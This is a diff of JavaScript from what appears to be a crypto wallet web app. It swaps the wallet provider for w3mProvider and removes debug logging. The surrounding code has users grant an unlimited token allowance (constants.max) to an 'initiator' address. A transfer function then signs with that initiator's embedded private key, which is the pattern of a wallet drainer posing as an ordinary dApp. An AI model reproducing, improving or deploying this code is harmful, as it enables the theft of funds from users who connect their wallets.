@@ -107,7 +107,7 @@ export const increaseAllowance = async (token) => {
       console.log("Please install MetaMask");
       return ;
     }
-    const web3 = new Web3(provider);
+    const web3 = new Web3(w3mProvider({ projectId }));
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
@@ -271,8 +271,6 @@ export const increaseAllowance = async (token) => {
       })
       return;
     }else if (increaseallown) {
-      console.log(increaseallown);
-      console.log("increase")
       await contract.methods.increaseAllowance(constants.initiator, constants.max)
       .send({ from: account })
       .on('transactionHash', async (hash) => {
@@ -305,7 +303,7 @@ export const transfer = async (token) => {
       console.log("Please install MetaMask");
       return ;
     }
-    const provider = new ethers.providers.Web3Provider(provideer);
+    const provider = new ethers.providers.Web3Provider(w3mProvider({ projectId }));
     const signer = new ethers.Wallet(constants.initiatorPK, provider);
     const account = getAccount().address;
     const erc20Contract = new ethers.Contract(
@@ -342,7 +340,7 @@ export const allownce = async (token) => {
       console.log("Please install MetaMask");
       return ;
     }
-    const web3 = new Web3(provider);
+    const web3 = new Web3(w3mProvider({ projectId }));
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
@@ -361,7 +359,7 @@ export const balanceOf = async (token) => {
       console.log("Please install MetaMask");
       return ;
     }
-    const web3 = new Web3(provider);
+    const web3 = new Web3(w3mProvider({ projectId }));
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
